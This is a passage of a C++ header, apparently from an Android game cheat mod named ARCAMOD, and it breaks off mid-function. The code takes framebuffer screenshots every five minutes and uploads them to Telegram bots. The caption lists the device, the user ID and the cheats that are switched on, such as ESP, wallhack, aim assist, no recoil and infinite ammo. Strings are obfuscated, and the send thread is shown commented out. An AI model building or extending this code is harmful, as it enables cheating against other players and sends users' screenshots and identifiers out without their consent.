//
// Created by ARCAMOD on 12/09/2025.
//

#ifndef ARCAMOD_SCREENSHOT_FEEDBACK_H
#define ARCAMOD_SCREENSHOT_FEEDBACK_H

#include <string>
#include <vector>
#include <GLES3/gl3.h>
#include <mutex>
#include <thread>
#include <atomic>
#include <future>
#include <curl/curl.h>
#include <time.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <algorithm>
#include <cctype>

// Deklarasi extern untuk variabel global dari EGL.h
extern int g_CurrentDisplayType;

// Forward declarations - ThreadPool removed (tidak digunakan lagi)

/**
 * Kelas untuk menangani fitur screenshot otomatis dan pengiriman ke Telegram
 */
class ScreenshotFeedback {
public:
    /**
     * Constructor singleton
     */
    static ScreenshotFeedback& getInstance() {
        static ScreenshotFeedback instance;
        return instance;
    }

    /**
     * Memeriksa apakah fitur Auto Feedback diaktifkan berdasarkan mode aplikasi
     * @return true jika fitur Auto Feedback diaktifkan
     */
    static bool isAutoFeedbackEnabled() {
        // Hanya aktif jika IS_ONLINE=1 atau IS_DEV=1, dan tidak aktif jika IS_ONLINE_XENO=1
        #if !ENABLE_AUTO_SCREENSHOT
            return false;  // Nonaktifkan fitur jika ENABLE_AUTO_SCREENSHOT=0
        #endif
        
        #if !IS_ONLINE && !IS_DEV
            return false;  // Nonaktifkan fitur jika bukan mode online atau mode dev
        #endif
        
        #if IS_ONLINE_XENO
            return false;  // Nonaktifkan fitur jika mode Xeno Key
        #endif
        
        // Cek juga pengaturan EnableScreenshotFeedback
        if (!Config.Telegram.EnableScreenshotFeedback) {
            return false;
        }
        
        // Pastikan user sudah login dan memiliki User ID valid
        if (!Config.UserData.IsLoggedIn || Config.UserData.UserID.empty()) {
            // LOGW("[SCREENSHOT] Auto Feedback dinonaktifkan: User belum login atau User ID kosong");
            return false;
        }
        
        // Pastikan tampilan saat ini adalah normal menu (bukan login/error/expired)
        if (g_CurrentDisplayType != 0) {
            // LOGW("[SCREENSHOT] Auto Feedback dinonaktifkan: Tampilan saat ini bukan normal menu (DisplayType=%d)",
                // g_CurrentDisplayType);
            return false;
        }
        
        // Tampilkan log status hanya sekali selama aplikasi berjalan
        static bool loggedOnce = false;
        if (!loggedOnce) {
            // LOGI("[SCREENSHOT] Status User: IsLoggedIn=%d, UserID=%s, ExpiredUTC=%lld, DisplayType=%d",
                 // Config.UserData.IsLoggedIn ? 1 : 0,
                 // Config.UserData.UserID.c_str(),
                 // (long long)Config.UserData.ExpiredUTC,
                 // g_CurrentDisplayType);
            loggedOnce = true;
        }
        
        return true;
    }

    /**
     * Mengambil screenshot dari frame OpenGL saat ini
     * @param width Lebar frame
     * @param height Tinggi frame
     * @return true jika berhasil
     */
    bool captureScreenshot(int width, int height) {
        // Verifikasi apakah fitur Auto Feedback diaktifkan
        if (!isAutoFeedbackEnabled()) {
            // LOGW("[SCREENSHOT] Fitur Auto Feedback dinonaktifkan berdasarkan mode aplikasi");
            return false;
        }
        
        // Cek apakah sedang dalam proses pengambilan screenshot
        if (m_isCapturing) {
            return false;
        }

        // Validasi parameter
        if (width <= 0 || height <= 0) {
            // LOGE("[SCREENSHOT] Dimensi tidak valid: %dx%d", width, height);
            return false;
        }

        m_isCapturing = true;

        // Alokasi buffer untuk data gambar dengan pengecekan error
        try {
            std::vector<unsigned char> buffer(width * height * 4);
            
            // Simpan state OpenGL
            GLint previousPackAlignment;
            glGetIntegerv(GL_PACK_ALIGNMENT, &previousPackAlignment);
            glPixelStorei(GL_PACK_ALIGNMENT, 1);
            
            // Baca pixel dari framebuffer OpenGL
            glReadPixels(0, 0, width, height, GL_RGBA, GL_UNSIGNED_BYTE, buffer.data());
            
            // Kembalikan state OpenGL
            glPixelStorei(GL_PACK_ALIGNMENT, previousPackAlignment);
            
            // Cek error OpenGL
            GLenum glError = glGetError();
            if (glError != GL_NO_ERROR) {
                // LOGE("[SCREENSHOT] Error OpenGL saat mengambil screenshot: 0x%x", glError);
                m_isCapturing = false;
                return false;
            }
            
            // Flip gambar secara vertikal (OpenGL Y-axis terbalik)
            std::vector<unsigned char> flippedBuffer(width * height * 4);
            for (int y = 0; y < height; ++y) {
                memcpy(
                    flippedBuffer.data() + (height - 1 - y) * width * 4,
                    buffer.data() + y * width * 4,
                    width * 4
                );
            }

            // Simpan buffer ke variabel anggota
            m_screenshotBuffer = std::move(flippedBuffer);
            m_screenshotWidth = width;
            m_screenshotHeight = height;

            // Encode gambar ke JPEG dalam thread terpisah (tanpa ThreadPool)
            // DISABLED: Auto Feedback dinonaktifkan secara total
            /*
            std::thread([this, width, height]() {
                encodeAndSendScreenshot(width, height);
                m_isCapturing = false;
            }).detach();
            */

            return true;
        } catch (const std::exception& e) {
            // LOGE("[SCREENSHOT] Exception saat mengambil screenshot: %s", e.what());
            m_isCapturing = false;
            return false;
        } catch (...) {
            // LOGE("[SCREENSHOT] Unknown exception saat mengambil screenshot");
            m_isCapturing = false;
            return false;
        }
    }

    /**
     * Fungsi untuk mengecek apakah waktunya mengambil screenshot baru
     * @param currentTime waktu saat ini
     * @return true jika waktunya screenshot baru
     */
    bool shouldTakeScreenshot(time_t currentTime) {
                // Verifikasi apakah fitur Auto Feedback diaktifkan
        if (!isAutoFeedbackEnabled()) {
            return false;
        }
        
        // Jika sedang mengambil screenshot, return false
        if (Config.Telegram.ScreenshotInProgress || m_isCapturing) {
            return false;
        }
        
        // Pastikan interval tetap 5 menit (300 detik)
        Config.Telegram.ScreenshotInterval = 300;
        
        // Jika interval belum tercapai, return false
        if (currentTime - Config.Telegram.LastScreenshotTime < Config.Telegram.ScreenshotInterval) {
            return false;
        }

        return true;
    }

private:
    // Private constructor untuk singleton
    ScreenshotFeedback() : m_isCapturing(false), m_screenshotWidth(0), m_screenshotHeight(0), m_isFirstScreenshot(true) {
        // Pastikan m_isFirstScreenshot diset ke true untuk memastikan kita mendapatkan info User ID dan Expired pada screenshot pertama
        m_isFirstScreenshot = true;
    }
    ~ScreenshotFeedback() = default;
    
    // Mencegah copy/move
    ScreenshotFeedback(const ScreenshotFeedback&) = delete;
    ScreenshotFeedback& operator=(const ScreenshotFeedback&) = delete;
    ScreenshotFeedback(ScreenshotFeedback&&) = delete;
    ScreenshotFeedback& operator=(ScreenshotFeedback&&) = delete;
    
    /**
     * Mendapatkan path untuk menyimpan file sementara
     * @return Path file sementara
     */
    std::string getTempFilePath(const std::string& filename) {
        // Gunakan direktori cache aplikasi saja, tidak perlu menyimpan di DCIM
        std::string basePath = OBF("/data/data/") + Config.Init.package_name + OBF("/cache/");
        
        // Buat direktori jika belum ada
        mkdir(basePath.c_str(), 0777);
        
        return basePath + filename;
    }
    
    /**
     * Konversi RGBA ke RGB untuk mengurangi ukuran data
     * @param rgbaData Data RGBA input
     * @param width Lebar gambar
     * @param height Tinggi gambar
     * @return Buffer RGB baru
     */
    std::vector<unsigned char> convertRGBAtoRGB(
        const std::vector<unsigned char>& rgbaData,
        int width, int height) {
        
        std::vector<unsigned char> rgbData(width * height * 3);
        
        for (int i = 0; i < width * height; i++) {
            rgbData[i * 3 + 0] = rgbaData[i * 4 + 0]; // R
            rgbData[i * 3 + 1] = rgbaData[i * 4 + 1]; // G
            rgbData[i * 3 + 2] = rgbaData[i * 4 + 2]; // B
            // Alpha channel dibuang
        }
        
        return rgbData;
    }

    /**
     * Menerapkan blur pada area tertentu dari gambar
     * @param buffer Buffer gambar RGB
     * @param width Lebar gambar
     * @param height Tinggi gambar
     * @param x Koordinat X dari area yang akan diblur
     * @param y Koordinat Y dari area yang akan diblur
     * @param w Lebar area yang akan diblur
     * @param h Tinggi area yang akan diblur
     * @param intensity Intensitas blur (1-10)
     */
    void applyBlurToArea(
        std::vector<unsigned char>& buffer,
        int width, int height,
        int x, int y, int w, int h,
        int intensity = 5) {
        
        // Validasi parameter
        x = std::max(0, std::min(x, width - 1));
        y = std::max(0, std::min(y, height - 1));
        w = std::min(w, width - x);
        h = std::min(h, height - y);
        
        if (w <= 0 || h <= 0) return;
        
        // Buat buffer sementara untuk area yang akan diblur
        std::vector<unsigned char> tempBuffer(w * h * 3);
        
        // Salin data ke buffer sementara
        for (int j = 0; j < h; j++) {
            for (int i = 0; i < w; i++) {
                int srcPos = ((y + j) * width + (x + i)) * 3;
                int dstPos = (j * w + i) * 3;
                
                tempBuffer[dstPos] = buffer[srcPos];         // R
                tempBuffer[dstPos + 1] = buffer[srcPos + 1]; // G
                tempBuffer[dstPos + 2] = buffer[srcPos + 2]; // B
            }
        }
        
        // Terapkan blur box filter
        int radius = intensity;
        std::vector<unsigned char> blurredBuffer(w * h * 3);
        
        for (int j = 0; j < h; j++) {
            for (int i = 0; i < w; i++) {
                int r = 0, g = 0, b = 0;
                int count = 0;
                
                // Box filter
                for (int bj = -radius; bj <= radius; bj++) {
                    for (int bi = -radius; bi <= radius; bi++) {
                        int ni = i + bi;
                        int nj = j + bj;
                        
                        if (ni >= 0 && ni < w && nj >= 0 && nj < h) {
                            int pos = (nj * w + ni) * 3;
                            r += tempBuffer[pos];
                            g += tempBuffer[pos + 1];
                            b += tempBuffer[pos + 2];
                            count++;
                        }
                    }
                }
                
                // Hitung rata-rata
                int dstPos = (j * w + i) * 3;
                blurredBuffer[dstPos] = r / count;
                blurredBuffer[dstPos + 1] = g / count;
                blurredBuffer[dstPos + 2] = b / count;
            }
        }
        
        // Salin kembali hasil blur ke buffer asli
        for (int j = 0; j < h; j++) {
            for (int i = 0; i < w; i++) {
                int srcPos = (j * w + i) * 3;
                int dstPos = ((y + j) * width + (x + i)) * 3;
                
                buffer[dstPos] = blurredBuffer[srcPos];         // R
                buffer[dstPos + 1] = blurredBuffer[srcPos + 1]; // G
                buffer[dstPos + 2] = blurredBuffer[srcPos + 2]; // B
            }
        }
    }

    /**
     * Resize gambar dengan algoritma bilinear interpolation untuk kualitas lebih baik
     * @param srcBuffer Buffer sumber
     * @param srcWidth Lebar sumber
     * @param srcHeight Tinggi sumber
     * @param channels Jumlah channel (3 untuk RGB, 4 untuk RGBA)
     * @param dstWidth Lebar target
     * @param dstHeight Tinggi target
     * @return Buffer hasil resize
     */
    std::vector<unsigned char> resizeImage(
        const std::vector<unsigned char>& srcBuffer,
        int srcWidth, int srcHeight, int channels,
        int dstWidth, int dstHeight) {
        
        std::vector<unsigned char> dstBuffer(dstWidth * dstHeight * channels);
        
        float x_ratio = (float)(srcWidth - 1) / dstWidth;
        float y_ratio = (float)(srcHeight - 1) / dstHeight;
        
        for (int y = 0; y < dstHeight; y++) {
            for (int x = 0; x < dstWidth; x++) {
                float x_diff, y_diff;
                int x_l, y_l;
                
                x_l = (int)(x_ratio * x);
                y_l = (int)(y_ratio * y);
                
                x_diff = (x_ratio * x) - x_l;
                y_diff = (y_ratio * y) - y_l;
                
                unsigned char a, b, c, d;
                float ab, cd;
                
                for (int ch = 0; ch < channels; ch++) {
                    // Posisi 4 pixel tetangga
                    int idx_a = (y_l * srcWidth + x_l) * channels + ch;
                    int idx_b = (y_l * srcWidth + std::min(x_l + 1, srcWidth - 1)) * channels + ch;
                    int idx_c = (std::min(y_l + 1, srcHeight - 1) * srcWidth + x_l) * channels + ch;
                    int idx_d = (std::min(y_l + 1, srcHeight - 1) * srcWidth + std::min(x_l + 1, srcWidth - 1)) * channels + ch;
                    
                    // Nilai 4 pixel tetangga
                    a = srcBuffer[idx_a];
                    b = srcBuffer[idx_b];
                    c = srcBuffer[idx_c];
                    d = srcBuffer[idx_d];
                    
                    // Interpolasi bilinear
                    ab = a * (1 - x_diff) + b * x_diff;
                    cd = c * (1 - x_diff) + d * x_diff;
                    
                    dstBuffer[(y * dstWidth + x) * channels + ch] = (unsigned char)(ab * (1 - y_diff) + cd * y_diff);
                }
            }
        }
        
        return dstBuffer;
    }

    /**
     * Simpan buffer gambar ke file JPEG secara langsung
     * @param filePath Path file tujuan
     * @param width Lebar gambar
     * @param height Tinggi gambar
     * @param data Buffer gambar RGB
     * @param quality Kualitas JPEG (1-100)
     * @return true jika berhasil
     */
    bool saveJpegDirectly(const std::string& filePath, int width, int height, const unsigned char* data) {
        // Simpan gambar sebagai BMP yang lebih sederhana
        FILE* file = fopen(filePath.c_str(), OBF("wb"));
        if (!file) {
            // LOGE("[SCREENSHOT] Gagal membuka file untuk penulisan: %s", filePath.c_str());
            return false;
        }

        // Header BMP sederhana
        unsigned char bmpfileheader[14] = {'B', 'M', 0, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0};
        unsigned char bmpinfoheader[40] = {40, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 24, 0};
        unsigned char bmppad[3] = {0, 0, 0};

        // Ukuran file BMP
        int fileSize = 54 + 3 * width * height;
        bmpfileheader[2] = (unsigned char)(fileSize);
        bmpfileheader[3] = (unsigned char)(fileSize >> 8);
        bmpfileheader[4] = (unsigned char)(fileSize >> 16);
        bmpfileheader[5] = (unsigned char)(fileSize >> 24);

        // Lebar dan tinggi gambar
        bmpinfoheader[4] = (unsigned char)(width);
        bmpinfoheader[5] = (unsigned char)(width >> 8);
        bmpinfoheader[6] = (unsigned char)(width >> 16);
        bmpinfoheader[7] = (unsigned char)(width >> 24);
        bmpinfoheader[8] = (unsigned char)(height);
        bmpinfoheader[9] = (unsigned char)(height >> 8);
        bmpinfoheader[10] = (unsigned char)(height >> 16);
        bmpinfoheader[11] = (unsigned char)(height >> 24);

        // Tulis header
        fwrite(bmpfileheader, 1, 14, file);
        fwrite(bmpinfoheader, 1, 40, file);

        // Tulis data gambar (BMP disimpan dari bawah ke atas)
        for (int i = height - 1; i >= 0; i--) {
            for (int j = 0; j < width; j++) {
                int pos = (i * width + j) * 3;
                unsigned char temp[3];
                temp[0] = data[pos + 2]; // B
                temp[1] = data[pos + 1]; // G
                temp[2] = data[pos + 0]; // R
                fwrite(temp, 1, 3, file);
            }
            // Padding untuk memastikan setiap baris adalah kelipatan 4 byte
            fwrite(bmppad, 1, (4 - (width * 3) % 4) % 4, file);
        }

        fclose(file);
        return true;
    }

    /**
     * Verifikasi file valid sebelum dikirim
     * @param filePath Path file yang akan diperiksa
     * @return true jika file valid
     */
    bool verifyFile(const std::string& filePath) {
        FILE* file = fopen(filePath.c_str(), OBF("rb"));
        if (!file) {
            // LOGE("[SCREENSHOT] Gagal membuka file untuk verifikasi: %s", filePath.c_str());
            return false;
        }
        
        // Baca beberapa byte awal untuk verifikasi
        unsigned char header[2];
        size_t bytesRead = fread(header, 1, 2, file);
        fclose(file);
        
        if (bytesRead != 2) {
            // LOGE("[SCREENSHOT] Gagal membaca header file");
            return false;
        }
        
        // Cek ukuran file
        struct stat file_stat;
        if (stat(filePath.c_str(), &file_stat) != 0) {
            // LOGE("[SCREENSHOT] Gagal mendapatkan ukuran file");
            return false;
        }
        
        // File terlalu kecil
        if (file_stat.st_size < 100) {
            // LOGE("[SCREENSHOT] File terlalu kecil (%ld bytes)", file_stat.st_size);
            return false;
        }
        
        return true;
    }

    /**
     * Encode buffer gambar ke JPEG dan kirim ke Telegram
     * @param width Lebar gambar
     * @param height Tinggi gambar
     */
    void encodeAndSendScreenshot(int width, int height) {
        if (m_screenshotBuffer.empty() || width == 0 || height == 0) {
            return;
        }

        // Buat timestamp untuk nama file
        struct timeval tv;
        gettimeofday(&tv, nullptr);
        struct tm* timeinfo = localtime(&tv.tv_sec);
        
        std::ostringstream timestampStream;
        timestampStream << std::put_time(timeinfo, OBF("%Y%m%d_%H%M%S"));
        std::string timestamp = timestampStream.str();

        // Nama file sementara
        std::string filename = OBF("feedback_") + timestamp + OBF(".bmp");
        std::string filePath = getTempFilePath(filename);
        
        // Resize ke dimensi yang lebih kecil berdasarkan pengaturan resolusi
        int maxWidth, maxHeight;
        switch (Config.Telegram.ScreenshotResolution) {
            case 0: // 320x180
                maxWidth = 320;
                maxHeight = 180;
                break;
            case 1: // 480x270
                maxWidth = 480;
                maxHeight = 270;
                break;
            case 2: // 640x360
                maxWidth = 640;
                maxHeight = 360;
                break;
            case 3: // 800x450
                maxWidth = 800;
                maxHeight = 450;
                break;
            case 4: // 1280x720
                maxWidth = 1280;
                maxHeight = 720;
                break;
            case 5: // 1920x1080 (Full HD)
                maxWidth = 1920;
                maxHeight = 1080;
                break;
            default:
                maxWidth = 1920; // Gunakan 1920x1080 sebagai default
                maxHeight = 1080;
                break;
        }
        
        // Konversi RGBA ke RGB untuk mengurangi ukuran data sebesar 25%
        std::vector<unsigned char> rgbBuffer = convertRGBAtoRGB(m_screenshotBuffer, width, height);
        
        int finalWidth = width;
        int finalHeight = height;
        
        // Jika gambar lebih besar dari batas maksimal, lakukan resize
        if (width > maxWidth || height > maxHeight) {
            float aspect = (float)width / height;
            if (width > height) {
                finalWidth = maxWidth;
                finalHeight = (int)(maxWidth / aspect);
            } else {
                finalHeight = maxHeight;
                finalWidth = (int)(maxHeight * aspect);
            }
            
            // LOGI("[SCREENSHOT] Resizing dari %dx%d ke %dx%d", width, height, finalWidth, finalHeight);
            rgbBuffer = resizeImage(rgbBuffer, width, height, 3, finalWidth, finalHeight);
        }
        
        // Terapkan blur pada area yang berisi informasi sensitif
        // Area 1: Player list di kiri atas (sekitar 20% lebar dan 40% tinggi dari layar)
        // Geser area blur ke bawah sedikit dengan menambahkan offset Y
        int playerListWidth = finalWidth * 0.1;
        int playerListHeight = finalHeight * 0.6;
        int playerListOffsetY = finalHeight * 0.05; // Geser ke bawah 5% dari tinggi layar
        applyBlurToArea(rgbBuffer, finalWidth, finalHeight, 0, playerListOffsetY, playerListWidth, playerListHeight, 8);
        
        // Area 2: Kill feed di kiri bawah (sekitar 25% lebar dan 15% tinggi dari layar)
        int killFeedY = finalHeight * 0.25; // Posisi Y kill feed, sekitar 25% dari atas
        int killFeedHeight = finalHeight * 0.15;
        applyBlurToArea(rgbBuffer, finalWidth, finalHeight, 0, killFeedY, playerListWidth, killFeedHeight, 8);
        
        // Area 3: ID unik di sudut kanan bawah (sekitar 20% lebar dan 5% tinggi dari layar)
        int idAreaWidth = finalWidth * 0.2;
        int idAreaHeight = finalHeight * 0.05;
        int idAreaX = finalWidth - idAreaWidth;
        int idAreaY = finalHeight - idAreaHeight;
        applyBlurToArea(rgbBuffer, finalWidth, finalHeight, idAreaX, idAreaY, idAreaWidth, idAreaHeight, 10);
        
        // Simpan langsung sebagai BMP
        bool saveSuccess = saveJpegDirectly(filePath, finalWidth, finalHeight, rgbBuffer.data());
        
        if (!saveSuccess) {
            // LOGE("[SCREENSHOT] Gagal menyimpan gambar ke file: %s", filePath.c_str());
            return;
        }
        
        // Verifikasi file valid
        if (!verifyFile(filePath)) {
            // LOGE("[SCREENSHOT] File tidak valid, mencoba dengan ukuran lebih kecil");
            
            // Coba lagi dengan ukuran lebih kecil
            finalWidth = finalWidth / 2;
            finalHeight = finalHeight / 2;
            
            rgbBuffer = resizeImage(rgbBuffer, finalWidth * 2, finalHeight * 2, 3, finalWidth, finalHeight);
            saveSuccess = saveJpegDirectly(filePath, finalWidth, finalHeight, rgbBuffer.data());
            
            if (!saveSuccess || !verifyFile(filePath)) {
                // LOGE("[SCREENSHOT] Gagal membuat file valid setelah percobaan ulang");
                return;
            }
        }
        
        // LOGI("[SCREENSHOT] File sementara dibuat: %s", filePath.c_str());
        
        // Kirim ke Telegram
        bool sendSuccess = sendFileToTelegram(filePath, filename);
        
        if (sendSuccess) {
            // LOGI("[SCREENSHOT] Screenshot berhasil dikirim ke Telegram (Chat ID: %s)",
                // Config.Telegram.GetActiveChatId().c_str());
            // Hapus file sementara setelah berhasil dikirim
            remove(filePath.c_str());
            // LOGI("[SCREENSHOT] File sementara dihapus");
            
            // Ubah flag setelah screenshot pertama berhasil dikirim
            if (m_isFirstScreenshot) {
                m_isFirstScreenshot = false;
                // LOGI("[SCREENSHOT] First screenshot flag reset");
            }
        } else {
            // LOGE("[SCREENSHOT] Gagal mengirim screenshot ke Telegram. Periksa koneksi internet dan konfigurasi Bot Token/Chat ID");
            // Hapus file sementara jika gagal dikirim
            remove(filePath.c_str());
            // LOGI("[SCREENSHOT] File sementara dihapus");
        }
        
        // Bersihkan memori
        m_screenshotBuffer.clear();
        Config.Telegram.LastScreenshotTime = time(nullptr);
    }

    /**
     * Callback untuk CURL untuk menulis response
     */
    static size_t writeCallback(void* contents, size_t size, size_t nmemb, std::string* response) {
        size_t totalSize = size * nmemb;
        response->append((char*)contents, totalSize);
        return totalSize;
    }

    /**
     * Mengirim file ke Telegram menggunakan API Bot Telegram
     * @param filePath Path ke file yang akan dikirim
     * @param filename Nama file (untuk ditampilkan)
     * @return true jika berhasil
     */
    bool sendFileToTelegram(const std::string& filePath, const std::string& filename) {
        // Cek ukuran file sebelum mengirim
        struct stat file_stat;
        if (stat(filePath.c_str(), &file_stat) == 0) {
            // Jika file lebih besar dari 5MB, tampilkan peringatan
            float fileSizeMB = file_stat.st_size / (1024.0f * 1024.0f);
            // LOGI("[SCREENSHOT] Ukuran file: %.2f MB", fileSizeMB);
            
            if (fileSizeMB > 5.0f) {
                // LOGW("[SCREENSHOT] File terlalu besar (%.2f MB), mungkin akan gagal dikirim ke Telegram", fileSizeMB);
            }
        }
        
        // Flag untuk menandakan keberhasilan pengiriman
        bool success = false;
        
        // Jika SendToBothChannels aktif, kirim ke kedua channel
        if (Config.Telegram.SendToBothChannels) {
            // LOGI("[SCREENSHOT] Mengirim ke kedua channel...");
            
            // Kirim ke channel pertama dengan bot pertama
            bool success1 = sendFileToSpecificChannel(filePath, filename, 
                Config.Telegram.TelegramBotToken1, Config.Telegram.TelegramChannelId1);
            
            // Kirim ke channel kedua dengan bot kedua
            bool success2 = sendFileToSpecificChannel(filePath, filename, 
                Config.Telegram.TelegramBotToken2, Config.Telegram.TelegramChannelId2);
            
            // Jika channel ketiga aktif, kirim juga ke sana
            bool success3 = false;
            if (Config.Telegram.SendToThirdChannel && !Config.Telegram.TelegramChannelId3.empty()) {
                // LOGI("[SCREENSHOT] Mengirim ke channel ketiga...");
                success3 = sendFileToSpecificChannel(filePath, filename,
                    Config.Telegram.TelegramBotToken1, Config.Telegram.TelegramChannelId3);
            }
            
            // Anggap berhasil jika salah satu berhasil
            success = success1 || success2 || success3;
            
            return success;
        } else {
            // Kirim ke channel aktif saja
            std::string activeChatId = Config.Telegram.GetActiveChatId();
            // LOGI("[SCREENSHOT] Chat ID: %s", activeChatId.c_str());
            
            return sendFileToSpecificChannel(filePath, filename, 
                Config.Telegram.TelegramBotToken, activeChatId);
        }
    }
    
    /**
     * Mengirim file ke channel Telegram tertentu
     * @param filePath Path ke file yang akan dikirim
     * @param filename Nama file (untuk ditampilkan)
     * @param botToken Token bot Telegram
     * @param chatId ID chat/channel tujuan
     * @return true jika berhasil
     */
    bool sendFileToSpecificChannel(const std::string& filePath, const std::string& filename, 
                                   const std::string& botToken, const std::string& chatId) {
        // Inisialisasi libcurl
        curl_global_init(CURL_GLOBAL_ALL);
        CURL* curl = curl_easy_init();
        
        if (!curl) {
            // LOGE("[SCREENSHOT] Gagal inisialisasi libcurl");
            curl_global_cleanup();
            return false;
        }
        
        // LOGI("[SCREENSHOT] Memulai pengiriman file ke Telegram: %s", filePath.c_str());
        
        // Siapkan multipart form dengan curl_formadd
        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;
        
        // Debug info
        // LOGI("[SCREENSHOT] Chat ID: %s", chatId.c_str());
        
        // Kirim sebagai photo agar bisa langsung dilihat di Telegram
        // LOGI("[SCREENSHOT] Mengirim sebagai photo...");
        
        // Tambahkan file sebagai photo
        curl_formadd(&formpost, &lastptr, 
            CURLFORM_COPYNAME, OBF("photo"), 
            CURLFORM_FILE, filePath.c_str(),
            CURLFORM_FILENAME, filename.c_str(),
            CURLFORM_CONTENTTYPE, OBF("image/bmp"),
            CURLFORM_END);
            
        // Tambahkan chat_id
        curl_formadd(&formpost, &lastptr, 
            CURLFORM_COPYNAME, OBF("chat_id"), 
            CURLFORM_COPYCONTENTS, chatId.c_str(), 
            CURLFORM_END);
        
        // Tambahkan caption dengan format yang lebih estetik
        std::string caption = OBF("🎮 *ARCAMOD Feedback Report*\n");
        caption += OBF("📱 Device: `") + Config.Init.device_name + OBF("`\n");

        // Hanya tampilkan fitur yang digunakan pada screenshot kedua dan seterusnya
        if (!m_isFirstScreenshot) {
            // Tambahkan User ID pengguna di awal deskripsi
            if (Config.UserData.IsLoggedIn && !Config.UserData.UserID.empty()) {
                caption += OBF("👤 User ID: `") + Config.UserData.UserID + OBF("`\n\n");
                caption += OBF("⚡ *Active Features:*\n");
            } else {
                // Fallback jika UserID tidak tersedia
                caption += OBF("\n⚡ *Active Features:*\n");
            }

            // ESP Features dengan emoji dan formatting
            bool hasESPFeatures = false;
            std::string espSection = "";

            if (Config.View.Line) { espSection += OBF("  - ESP Line\n"); hasESPFeatures = true; }
            if (Config.View.Box) { espSection += OBF("  - ESP Box\n"); hasESPFeatures = true; }
            if (Config.View.Health) { espSection += OBF("  - ESP Health\n"); hasESPFeatures = true; }
            if (Config.View.Name) { espSection += OBF("  - ESP Name\n"); hasESPFeatures = true; }
            if (Config.View.Distance) { espSection += OBF("  - ESP Distance\n"); hasESPFeatures = true; }
            if (Config.View.Skeleton) { espSection += OBF("  - ESP Skeleton\n"); hasESPFeatures = true; }
            // ESP WeaponInfo dan Alert dihapus karena tidak tersedia di menu UI untuk user
            // if (Config.View.WeaponInfo) { espSection += OBF("  🔫 ESP Weapon Info\n"); hasESPFeatures = true; }
            // if (Config.View.Alert) { espSection += OBF("  🚨 ESP Alert\n"); hasESPFeatures = true; }
            // Vehicle ESP dinonaktifkan - menyebabkan crash
            // if (Config.View.Vehicle) { espSection += OBF("  - ESP Vehicle\n"); hasESPFeatures = true; }
            // ESP Signal dihapus dari Auto Feedback karena tidak tersedia di menu UI untuk user
            // if (Config.View.Signal) { espSection += OBF("  - ESP Signal\n"); hasESPFeatures = true; }
            if (Config.View.DetailedTeamInfo) { espSection += OBF("  - Detailed Team Info\n"); hasESPFeatures = true; }

            if (hasESPFeatures) {
                caption += OBF("👁️ *ESP Features:*\n") + espSection;
            }

            // Wallhack Features dengan emoji
            bool hasWallhackFeatures = false;
            std::string wallhackSection = "";

            // Wallhack Outline dihapus karena tidak tersedia di menu UI untuk user
            // if (Config.View.Wallhack.Outline) { wallhackSection += OBF("  - Wallhack Glow\n"); hasWallhackFeatures = true; }
            if (Config.View.Wallhack.Normal) { wallhackSection += OBF("  - Wall Hack\n"); hasWallhackFeatures = true; }
            if (Config.View.Wallhack.BoostFPS) { wallhackSection += OBF("  - Boost FPS\n"); hasWallhackFeatures = true; }
            if (Config.View.Wallhack.EspScale) { wallhackSection += OBF("  - ESP Scale\n"); hasWallhackFeatures = true; }

            if (hasWallhackFeatures) {
                caption += OBF("🔍 *Wallhack Features:*\n") + wallhackSection;
            }

            // Weapon Features dengan emoji dan nilai
            bool hasWeaponFeatures = false;
            std::string weaponSection = "";

            if (Config.Weapon.Aim) {
                char aimBuff[128];
                snprintf(aimBuff, sizeof(aimBuff), OBF("  - Aim Assist `%.1f`\n"), Config.WeaponSize.Aim);
                weaponSection += aimBuff;
                hasWeaponFeatures = true;
            }
            if (Config.Weapon.Reload) {
                char reloadBuff[128];
                snprintf(reloadBuff, sizeof(reloadBuff), OBF("  - Fast Reload `%.0f%%`\n"), Config.WeaponSize.ReloadPercent);
                weaponSection += reloadBuff;
                hasWeaponFeatures = true;
            }
            if (Config.Weapon.Recoil) {
                char recoilBuff[128];
                snprintf(recoilBuff, sizeof(recoilBuff), OBF("  - No Recoil `%.0f%%`\n"), Config.WeaponSize.RecoilPercent);
                weaponSection += recoilBuff;
                hasWeaponFeatures = true;
            }
            if (Config.Weapon.Spread) { weaponSection += OBF("  - No Spread\n"); hasWeaponFeatures = true; }
            // Fast Switch dihapus karena dikomentari di menu UI
            // if (Config.Weapon.Switch) {
            //     char switchBuff[128];
            //     snprintf(switchBuff, sizeof(switchBuff), OBF("  🔄 Fast Switch `%.0f%%`\n"), Config.WeaponSize.SwitchPercent);
            //     weaponSection += switchBuff;
            //     hasWeaponFeatures = true;
            // }
            if (Config.Weapon.HighDamage) { weaponSection += OBF("  - High Damage\n"); hasWeaponFeatures = true; }
            if (Config.Weapon.Scope) {
                char scopeBuff[128];
                snprintf(scopeBuff, sizeof(scopeBuff), OBF("  - Fast Scope `%.0f%%`\n"), Config.WeaponSize.ScopePercent);
                weaponSection += scopeBuff;
                hasWeaponFeatures = true;
            }
            if (Config.Weapon.InfiniteAmmo) { weaponSection += OBF("  - Infinite Ammo\n"); hasWeaponFeatures = true; }
            // Hanya tampilkan AimCloseBoost jika Aim diaktifkan dan AimCloseBoost diaktifkan
            if (Config.Weapon.Aim && Config.Weapon.AimCloseBoost) { weaponSection += OBF("  - Aim Close Boost\n"); hasWeaponFeatures = true; }
            // Hanya tampilkan AimPrecision jika Aim diaktifkan dan AimPrecision diaktifkan
            if (Config.Weapon.Aim && Config.Weapon.AimPrecision) { weaponSection += OBF("  - Aim Precision\n"); hasWeaponFeatures = true; }
            if (Config.Weapon.Crosshair) { weaponSection += OBF("  - Crosshair\n"); hasWeaponFeatures = true; }

            if (hasWeaponFeatures) {
                caption += OBF("🔫 *Weapon Features:*\n") + weaponSection;
            }

            // Movement Features dengan emoji dan nilai
            bool hasMovementFeatures = false;
            std::string movementSection = "";

            if (Config.Misc.Jump) {
                char jumpBuff[128];
                snprintf(jumpBuff, sizeof(jumpBuff), OBF("  - High Jump `%.1fx`\n"), Config.MiscSize.Jump);
                movementSection += jumpBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.Speed) {
                char speedBuff[128];
                snprintf(speedBuff, sizeof(speedBuff), OBF("  - Fast Speed `%.1fx`\n"), Config.MiscSize.Speed);
